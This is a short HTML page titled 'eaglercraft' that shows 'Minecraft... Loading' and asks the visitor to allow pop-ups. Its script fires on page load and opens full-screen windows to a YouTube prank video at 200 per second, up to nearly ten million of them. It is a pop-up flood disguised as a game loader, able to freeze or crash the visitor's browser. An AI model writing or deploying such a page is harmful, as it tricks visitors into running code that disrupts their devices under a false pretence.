<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eaglercraft</title>
    <script>
        function openWindows(url, numberOfWindows, interval) {
            let count = 0;

            function openWindow() {
                if (count < numberOfWindows) {
                    const screenWidth = window.screen.availWidth;
                    const screenHeight = window.screen.availHeight;

                    // Set window dimensions to match screen dimensions
                    const windowWidth = screenWidth;
                    const windowHeight = screenHeight;

                    // Open the window
                    window.open(url, '_blank', `width=${windowWidth},height=${windowHeight},left=0,top=0,scrollbars=no,toolbar=no,location=no,menubar=no,resizable=yes`);

                    count++;
                    setTimeout(openWindow, interval);
                }
            }

            openWindow();
        }

        window.onload = function() {
            const url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; 
            const windowsPerSecond = 200; 
            const interval = 1000 / windowsPerSecond; 

            openWindows(url, 9999999, interval); 
        };
    </script>
</head>
<body>
    <h1>Minecraft... Loading</h1>
    <p style="color:#FF0000;">Allow pop-ups</p>
</body>
</html>
